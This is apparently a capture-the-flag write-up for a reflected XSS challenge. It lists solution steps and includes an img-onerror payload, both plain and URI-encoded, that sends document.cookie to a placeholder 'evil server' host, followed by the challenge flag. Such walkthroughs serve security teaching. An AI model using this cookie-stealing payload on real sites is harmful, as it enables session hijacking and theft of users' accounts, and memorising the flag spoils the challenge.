## Solution Steps
* Recognize that the vulnerable server has an input field, and inputs are then passed to the URL query parameter "q".
* Explore XSS vulnerabilities by trying to enter JS code in the input field and into the URL query parameter.
* Notice that only URI-encoded payloads can be executed by manipulating the URL query parameter. You can encode payloads using websites online or the DevTools JS Console with the encodeURIcomponent() function.
* Now to send the cookie to the evil server, we need to enter a payload similar to this: < img src="does-not-exist" onerror="var img = document.createElement(\'img\'); img.src = \'http://URL-OF-EVIL-SERVER/cookie?data=\' + document.cookie;">
* Encoded payload example using localhost: "%3Cimg%20src%3D%22does-not-exist%22%20onerror%3D%22var%20img%20%3D%20document.createElement('img')%3B%20img.src%20%3D%20'http%3A%2F%2Flocalhost%3A3001%2Fcookie%3Fdata%3D'%20%2B%20document.cookie%3B%22%3E"
* Remember to substitute the correct URL/IP address of the evil server, do not use localhost because your browser will use your actual local device
* Finally, navigate back to the evil server, which has been listening for the cookie to arrive, and refresh the page to see the flag.
* Flag: `jctf{who_said_you_could_open_the_cookie_jar!?}`